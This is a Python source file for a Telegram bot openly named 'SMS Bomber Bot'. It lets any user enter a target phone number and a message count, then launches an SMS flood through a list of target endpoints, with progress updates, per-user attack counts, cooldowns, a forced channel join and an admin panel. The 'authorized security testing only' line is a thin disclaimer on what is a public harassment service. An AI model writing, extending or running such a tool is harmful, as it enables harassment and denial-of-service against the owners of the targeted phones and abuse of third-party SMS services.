#!/usr/bin/env python3
"""
SMS Bomber Bot - Main Application (FIXED)
All known bugs resolved.
"""

import os
import sys
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Dict, Optional
from dataclasses import dataclass

# ============================================================
# LOAD .env FILE FIRST (before any config imports)
# ============================================================
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass  # python-dotenv not installed, rely on system env vars

# ============================================================
# VALIDATE ENVIRONMENT BEFORE ANYTHING ELSE
# ============================================================
_missing = []
if not os.getenv("BOT_TOKEN", "").strip():   _missing.append("BOT_TOKEN")
if not os.getenv("API_ID", "").strip():      _missing.append("API_ID")
if not os.getenv("API_HASH", "").strip():    _missing.append("API_HASH")

if _missing:
    print("=" * 55)
    print("❌  BOT CONFIGURATION ERROR")
    print("=" * 55)
    print(f"Missing environment variables: {', '.join(_missing)}")
    print()
    print("Create a .env file with:")
    print("  BOT_TOKEN=your_bot_token_from_BotFather")
    print("  API_ID=your_api_id_from_my.telegram.org")
    print("  API_HASH=your_api_hash_from_my.telegram.org")
    print()
    print("Get credentials from:")
    print("  Token  → https://t.me/BotFather")
    print("  API ID → https://my.telegram.org/auth")
    print("=" * 55)
    sys.exit(1)

# ============================================================
# NOW IMPORT EVERYTHING SAFELY
# ============================================================
from pyrogram import Client, filters, idle
from pyrogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    Message, CallbackQuery
)
from pyrogram.errors import (
    UserNotParticipant, FloodWait, MessageNotModified,
    ChatAdminRequired
)

from config import (
    bot_config, channel_config, rate_limits,
    MESSAGES, TARGET_ENDPOINTS, ADMIN_IDS
)
from sms import SMSBomber, validate_phone, AttackStats

# ============================================================
# LOGGING SETUP
# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("bot.log", encoding="utf-8"),
    ],
)
logger = logging.getLogger(__name__)


# ============================================================
# SESSION DATA
# ============================================================

@dataclass
class UserSession:
    """Per-user session state"""
    user_id: int
    username: Optional[str] = None
    step: str = "idle"          # idle | phone | count | attacking
    phone: Optional[str] = None
    count: int = 0
    last_attack: Optional[datetime] = None
    total_attacks: int = 0
    message_id: Optional[int] = None


# ============================================================
# BOT STATE
# ============================================================

class BotState:
    """Thread-safe global bot state"""

    def __init__(self):
        self.sessions: Dict[int, UserSession] = {}
        self.active_bombers: Dict[int, SMSBomber] = {}
        self.cooldowns: Dict[int, datetime] = {}
        self.global_count: int = 0
        self._lock = asyncio.Lock()

    def get_session(self, user_id: int, username: Optional[str] = None) -> UserSession:
        if user_id not in self.sessions:
            self.sessions[user_id] = UserSession(user_id=user_id, username=username)
        return self.sessions[user_id]

    async def check_cooldown(self, user_id: int) -> tuple:
        """Returns (can_proceed: bool, remaining_time: str)"""
        async with self._lock:
            if user_id in self.cooldowns:
                elapsed = datetime.now() - self.cooldowns[user_id]
                cooldown_td = timedelta(hours=rate_limits.COOLDOWN_HOURS)
                if elapsed < cooldown_td:
                    remaining = cooldown_td - elapsed
                    hours, rem = divmod(int(remaining.total_seconds()), 3600)
                    minutes, _ = divmod(rem, 60)
                    return False, f"{hours}h {minutes}m"
                else:
                    del self.cooldowns[user_id]
            return True, ""

    async def set_cooldown(self, user_id: int):
        async with self._lock:
            self.cooldowns[user_id] = datetime.now()

    async def can_start_attack(self) -> bool:
        async with self._lock:
            return len(self.active_bombers) < rate_limits.MAX_CONCURRENT_ATTACKS


# ============================================================
# INITIALIZE BOT
# ============================================================

state = BotState()

app = Client(
    "sms_bomber_bot",
    api_id=bot_config.API_ID,
    api_hash=bot_config.API_HASH,
    bot_token=bot_config.TOKEN,
    workers=100,
    parse_mode="markdown",
)


# ============================================================
# KEYBOARDS
# ============================================================

def main_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Start Attack", callback_data="start")],
        [InlineKeyboardButton("📊 Statistics",   callback_data="stats")],
        [InlineKeyboardButton("❓ Help",          callback_data="help")],
    ])


def verify_keyboard() -> InlineKeyboardMarkup:
    """FIX: Guard against empty channel username"""
    buttons = []
    if channel_config.USERNAME:
        url = f"https://t.me/{channel_config.USERNAME.lstrip('@')}"
        buttons.append([InlineKeyboardButton("📢 Join Channel", url=url)])
    buttons.append([InlineKeyboardButton("✅ Verify Join", callback_data="verify")])
    buttons.append([InlineKeyboardButton("🔙 Back",        callback_data="back")])
    return InlineKeyboardMarkup(buttons)


def cancel_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
    ])


def done_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 New Attack", callback_data="start")],
        [InlineKeyboardButton("🏠 Main Menu",  callback_data="back")],
    ])


# ============================================================
# MEMBERSHIP CHECK
# ============================================================

async def check_membership(user_id: int) -> bool:
    """Returns True if user can use the bot (member check or not configured)."""
    if not channel_config.is_configured:
        return True

    try:
        member = await app.get_chat_member(channel_config.ID, user_id)
        return member.status not in {"left", "kicked", "banned"}
    except UserNotParticipant:
        return False
    except ChatAdminRequired:
        logger.warning("Bot is not admin in force-join channel — skipping check")
        return True  # Fail open
    except Exception as e:
        logger.error(f"Membership check error: {e}")
        return True  # Fail open to avoid blocking users on API errors


# ============================================================
# COMMAND HANDLERS
# ============================================================

@app.on_message(filters.command("start") & (filters.private | filters.group))
async def cmd_start(client, message: Message):
    """Handle /start"""
    try:
        user = message.from_user
        if not user:
            logger.warning("/start received with no user info (anonymous admin?)")
            return

        logger.info(f"/start from {user.id} (@{user.username}) in {message.chat.type}")

        session = state.get_session(user.id, user.username)
        session.step = "idle"

        welcome = MESSAGES["WELCOME"].format(count=len(TARGET_ENDPOINTS))

        # Force-join check only in private chats
        if message.chat.type == "private" and channel_config.is_configured:
            try:
                if not await check_membership(user.id):
                    force_msg = MESSAGES["FORCE_JOIN"].format(channel=channel_config.USERNAME)
                    await message.reply_text(welcome + "\n\n" + force_msg, reply_markup=verify_keyboard())
                    return
            except Exception as e:
                logger.error(f"Membership check failed during /start: {e}")
                # Continue anyway — don't block user on check failure

        await message.reply_text(welcome, reply_markup=main_keyboard())

    except Exception as e:
        logger.error(f"/start handler error: {e}", exc_info=True)
        try:
            await message.reply_text("❌ An error occurred. Please try again.")
        except Exception:
            pass


@app.on_message(filters.command("help") & (filters.private | filters.group))
async def cmd_help(client, message: Message):
    """Handle /help"""
    try:
        help_text = """
📖 **SMS Bomber Bot — Help**

**How to use:**
1. Start a private chat with the bot
2. Click 🚀 Start Attack
3. Enter target phone number (+91XXXXXXXXXX)
4. Enter how many SMS to send (1–{max})
5. Wait for the attack to complete

**Supported number formats:**
• +91XXXXXXXXXX
• 91XXXXXXXXXX
• XXXXXXXXXX (10 digits, Indian)

**Limits:**
• Max {max} SMS per attack
• {cooldown}h cooldown between attacks
• Max {concurrent} simultaneous attacks (global)

**Commands:**
/start — Start the bot
/help  — Show this message
/stats — Your personal statistics
/admin — Admin panel (admins only)

⚠️ For authorized security testing only.
""".format(
            max=rate_limits.MAX_ATTEMPTS_PER_USER,
            cooldown=rate_limits.COOLDOWN_HOURS,
            concurrent=rate_limits.MAX_CONCURRENT_ATTACKS,
        )

        kb = main_keyboard() if message.chat.type == "private" else None
        await message.reply_text(help_text, reply_markup=kb)

    except Exception as e:
        logger.error(f"/help handler error: {e}", exc_info=True)
        await message.reply_text("❌ Error showing help.")


@app.on_message(filters.command("stats") & (filters.private | filters.group))
async def cmd_stats(client, message: Message):
    """Handle /stats"""
    try:
        user = message.from_user
        if not user:
            await message.reply_text("❌ Cannot identify user.")
            return

        session = state.get_session(user.id, user.username)

        last_atk = (
            session.last_attack.strftime("%Y-%m-%d %H:%M")
            if session.last_attack else "Never"
        )

        stats_text = f"""
**📊 Your Statistics**

👤 User: `{user.id}` (@{user.username or 'N/A'})
🎯 Total Attacks: {session.total_attacks}
📱 Last Target: {session.phone or 'N/A'}
⏱️ Last Attack: {last_atk}

**Global:**
⚡ Active Attacks: {len(state.active_bombers)}
📤 Total Sent: {state.global_count}
"""
        kb = main_keyboard() if message.chat.type == "private" else None
        await message.reply_text(stats_text, reply_markup=kb)

    except Exception as e:
        logger.error(f"/stats handler error: {e}", exc_info=True)
        await message.reply_text("❌ Error fetching stats.")


@app.on_message(filters.command("admin") & filters.private)
async def cmd_admin(client, message: Message):
    """Handle /admin — admin-only panel"""
    try:
        user = message.from_user
        if not user or user.id not in ADMIN_IDS:
            await message.reply_text(MESSAGES["UNAUTHORIZED"])
            return

        admin_text = f"""
🔐 **Admin Panel**

👤 Your ID: `{user.id}`
📊 Active Attacks: {len(state.active_bombers)}
🌍 Global SMS Sent: {state.global_count}
👥 Sessions: {len(state.sessions)}
🕐 Cooldowns Active: {len(state.cooldowns)}

**Config:**
Channel: {channel_config.USERNAME or 'Not set'}
Admin IDs: {ADMIN_IDS or 'None'}
Max/User: {rate_limits.MAX_ATTEMPTS_PER_USER}
Cooldown: {rate_limits.COOLDOWN_HOURS}h
"""
        await message.reply_text(admin_text)

    except Exception as e:
        logger.error(f"/admin handler error: {e}", exc_info=True)
        await message.reply_text("❌ Error in admin command.")


# ============================================================
# CALLBACK QUERY HANDLER
# ============================================================

@app.on_callback_query()
async def callback_handler(client, callback_query: CallbackQuery):
    """Handle all inline keyboard button presses"""
    user_id = callback_query.from_user.id
    data = callback_query.data
    session = state.get_session(user_id)

    try:
        if data == "start":
            # Force-join check
            if channel_config.is_configured and not await check_membership(user_id):
                await callback_query.message.edit_text(
                    MESSAGES["FORCE_JOIN"].format(channel=channel_config.USERNAME),
                    reply_markup=verify_keyboard()
                )
                await callback_query.answer("Join the required channel first!", show_alert=True)
                return

            # Cooldown check
            can_proceed, remaining = await state.check_cooldown(user_id)
            if not can_proceed:
                await callback_query.answer(
                    f"⏱️ Cooldown active. Try again in {remaining}.",
                    show_alert=True
                )
                return

            # Global limit check
            if not await state.can_start_attack():
                await callback_query.answer(
                    "🔴 Server busy. Too many active attacks. Try again later.",
                    show_alert=True
                )
                return

            session.step = "phone"
            await callback_query.message.edit_text(
                MESSAGES["ENTER_PHONE"],
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Back", callback_data="back")]
                ])
            )
            await callback_query.answer()

        elif data == "verify":
            if channel_config.is_configured:
                is_member = await check_membership(user_id)
                if is_member:
                    await callback_query.message.edit_text(
                        MESSAGES["WELCOME"].format(count=len(TARGET_ENDPOINTS)),
                        reply_markup=main_keyboard()
                    )
                    await callback_query.answer("✅ Verified! Welcome.")
                else:
                    await callback_query.answer("❌ You haven't joined the channel yet!", show_alert=True)
            else:
                # No channel configured — just go home
                await callback_query.message.edit_text(
                    MESSAGES["WELCOME"].format(count=len(TARGET_ENDPOINTS)),
                    reply_markup=main_keyboard()
                )
                await callback_query.answer("✅ Verified!")

        elif data == "stats":
            session_obj = state.get_session(user_id)
            await callback_query.message.edit_text(
                f"**📊 Statistics**\n\n"
                f"⚡ Active Attacks: {len(state.active_bombers)}\n"
                f"🎯 Your Total: {session_obj.total_attacks}\n"
                f"📤 Global Sent: {state.global_count}",
                reply_markup=main_keyboard()
            )
            await callback_query.answer()

        elif data == "help":
            await callback_query.message.edit_text(
                "**❓ Help**\n\nSend /help for detailed instructions.",
                reply_markup=main_keyboard()
            )
            await callback_query.answer()

        elif data == "back":
            session.step = "idle"
            await callback_query.message.edit_text(
                MESSAGES["WELCOME"].format(count=len(TARGET_ENDPOINTS)),
                reply_markup=main_keyboard()
            )
            await callback_query.answer()

        elif data == "cancel":
            if user_id in state.active_bombers:
                bomber = state.active_bombers[user_id]
                await bomber.stop()
                del state.active_bombers[user_id]

            session.step = "idle"
            await callback_query.message.edit_text(
                "❌ Attack cancelled.",
                reply_markup=main_keyboard()
            )
            await callback_query.answer("Cancelled.")

        else:
            await callback_query.answer("Unknown action.")

    except FloodWait as e:
        logger.warning(f"FloodWait: sleeping {e.value}s")
        await asyncio.sleep(e.value)
    except MessageNotModified:
        await callback_query.answer()
    except Exception as e:
        logger.error(f"Callback error (data={data}): {e}", exc_info=True)
        try:
            await callback_query.answer("An error occurred.", show_alert=True)
        except Exception:
            pass


# ============================================================
# TEXT MESSAGE HANDLER (state machine)
# ============================================================

@app.on_message(filters.text & filters.private)
async def text_handler(client, message: Message):
    """Handle user text input for the attack flow"""
    user = message.from_user
    if not user:
        return

    user_id = user.id
    text = message.text.strip()
    session = state.get_session(user_id, user.username)

    # Ignore commands — let command handlers deal with them
    if text.startswith("/"):
        return

    back_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Back", callback_data="back")]
    ])

    # ── IDLE ──────────────────────────────────────────────
    if session.step == "idle":
        await message.reply_text(
            "Press **🚀 Start Attack** to begin.",
            reply_markup=main_keyboard()
        )
        return

    # ── PHONE INPUT ───────────────────────────────────────
    if session.step == "phone":
        is_valid, result = validate_phone(text)
        if not is_valid:
            await message.reply_text(
                MESSAGES["ERROR"].format(message=result),
                reply_markup=back_kb
            )
            return

        session.phone = result
        session.step = "count"
        await message.reply_text(
            MESSAGES["ENTER_COUNT"].format(
                max=rate_limits.MAX_ATTEMPTS_PER_USER,
                cooldown=rate_limits.COOLDOWN_HOURS
            ),
            reply_markup=back_kb
        )
        return

    # ── COUNT INPUT ───────────────────────────────────────
    if session.step == "count":
        try:
            count = int(text)
        except ValueError:
            await message.reply_text(
                MESSAGES["ERROR"].format(message="Please enter a valid number."),
                reply_markup=back_kb
            )
            return

        if count < 1 or count > rate_limits.MAX_ATTEMPTS_PER_USER:
            await message.reply_text(
                MESSAGES["ERROR"].format(
                    message=f"Enter a number between 1 and {rate_limits.MAX_ATTEMPTS_PER_USER}."
                ),
                reply_markup=back_kb
            )
            return

        if user_id in state.active_bombers:
            await message.reply_text("⚠️ You already have an active attack running.")
            return

        session.count = count
        session.step = "attacking"

        status_msg = await message.reply_text(
            MESSAGES["ATTACK_START"].format(
                number=session.phone,
                count=count,
                endpoints=len(TARGET_ENDPOINTS)
            ),
            reply_markup=cancel_keyboard()
        )
        session.message_id = status_msg.id

        bomber = SMSBomber(
            phone_number=session.phone,
            count=count,
            progress_callback=lambda stats: _update_progress(user_id, stats)
        )
        state.active_bombers[user_id] = bomber

        asyncio.create_task(_run_attack(user_id, bomber, message.chat.id))
        return

    # ── ATTACKING (user sends something while attack running) ──
    if session.step == "attacking":
        await message.reply_text(
            "⏳ Attack in progress. Use **❌ Cancel** button to stop.",
            reply_markup=cancel_keyboard()
        )


# ============================================================
# ATTACK HELPERS
# ============================================================

async def _update_progress(user_id: int, stats: AttackStats):
    """Push live progress to the status message."""
    session = state.get_session(user_id)
    if not session.message_id:
        return

    bomber = state.active_bombers.get(user_id)
    if not bomber:
        return

    try:
        await app.edit_message_text(
            chat_id=user_id,
            message_id=session.message_id,
            text=bomber.format_status(),
            reply_markup=cancel_keyboard()
        )
    except MessageNotModified:
        pass
    except FloodWait:
        pass
    except Exception as e:
        logger.error(f"Progress update error: {e}")


async def _run_attack(user_id: int, bomber: SMSBomber, chat_id: int):
    """Run the full attack lifecycle and send completion message."""
    session = state.get_session(user_id)

    try:
        stats = await bomber.start()

        # Update session stats
        session.total_attacks += 1
        session.last_attack = datetime.now()
        await state.set_cooldown(user_id)

        async with state._lock:
            state.global_count += stats.total

        complete_text = MESSAGES["ATTACK_COMPLETE"].format(
            number=session.phone,
            attempted=stats.total,
            success=stats.success,
            failed=stats.failed,
            duration=stats.duration,
            rate=stats.rate,
        )

        try:
            await app.edit_message_text(
                chat_id=chat_id,
                message_id=session.message_id,
                text=complete_text,
                reply_markup=done_keyboard()
            )
        except Exception:
            # Fallback: send a new message if edit fails
            await app.send_message(chat_id, complete_text, reply_markup=done_keyboard())

    except Exception as e:
        logger.error(f"Attack error for user {user_id}: {e}", exc_info=True)
        try:
            await app.send_message(
                chat_id,
                MESSAGES["ERROR"].format(message=str(e)),
                reply_markup=done_keyboard()
            )
        except Exception:
            pass

    finally:
        # Always clean up, even if attack crashed
        session.step = "idle"
        state.active_bombers.pop(user_id, None)


# ============================================================
# MAIN ENTRY POINT
# ============================================================

async def main():
    """Start the bot and keep it running."""
    logger.info("=" * 55)
    logger.info("SMS Bomber Bot — Starting")
    logger.info(f"  API_ID   : {bot_config.API_ID}")
    logger.info(f"  Token    : {bot_config.TOKEN[:10]}...")
    logger.info(f"  Endpoints: {len(TARGET_ENDPOINTS)}")
    logger.info(f"  ForceJoin: {'Enabled' if channel_config.is_configured else 'Disabled'}")
    logger.info(f"  Admins   : {ADMIN_IDS or 'None'}")
    logger.info("=" * 55)

    await app.start()
    me = await app.get_me()
    logger.info(f"✅ Bot online: @{me.username} (ID: {me.id})")

    await idle()

    await app.stop()
    logger.info("Bot stopped.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Stopped by user.")
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)
